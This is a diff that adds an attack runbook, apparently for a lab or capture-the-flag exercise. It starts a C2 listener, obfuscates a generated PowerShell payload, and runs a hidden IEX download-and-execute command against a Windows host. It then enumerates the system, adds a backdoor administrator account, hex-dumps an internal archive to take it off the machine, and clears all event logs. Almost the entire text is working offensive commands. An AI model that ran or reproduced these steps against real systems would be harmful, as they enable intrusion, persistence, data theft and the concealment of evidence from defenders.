@@ -1,0 +1,76 @@
+# Run C2
+cd c2
+./clear
+python3 c2.py
+
+# Listener setup and payload generation
+listeners
+start listenup 1337 enp0s3
+home
+payloads
+generate powershell x64 listenup xkbqt.ps1
+exit
+cd ..
+
+# Import and run obfuscator module in PowerShell
+pwsh
+Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+
+# Obfuscate the generated paylod using various options
+SET SCRIPTPATH c2/data/listeners/listenup/files/xkbqt.ps1
+TOKEN
+ALL
+1
+HOME
+COMPRESS
+1
+OUT
+c2/data/listeners/listenup/files/xkbqt.ps1
+EXIT
+EXIT
+
+# Run C2 again
+cd c2
+python3 c2.py
+
+# RUN ON WINDOWS HOST
+powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.3:1337/sc/xkbqt.ps1')"
+
+# ON LINUX HOST - check first what agent checks in, run these manually with some time in between
+agents
+rename KQBJJP WIN10
+interact WIN10
+
+# Quick basics
+shell whoami
+shell whoami /all
+
+# Host information
+shell systeminfo
+shell tasklist
+shell fsutil fsinfo drives
+shell set
+
+# Add admin user with flag as password
+shell net user
+shell net user botmaster welcomeToMyArmy /add /Y
+shell net localgroup administrators botmaster /add
+shell net user
+shell net localgroup administrators
+
+# Quick file enumeration
+shell cd
+shell dir
+shell dir Documents
+powershell (Format-Hex .\Documents\internal.zip | Select-Object -Expand Bytes | ForEach-Object { '{0:x2}' -f $_ }) -join ''
+shell dir Downloads
+shell type .\Downloads\psyduck.txt
+
+# Clear logs
+powershell Get-EventLog -List
+powershell Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+# End
+quit
+exit
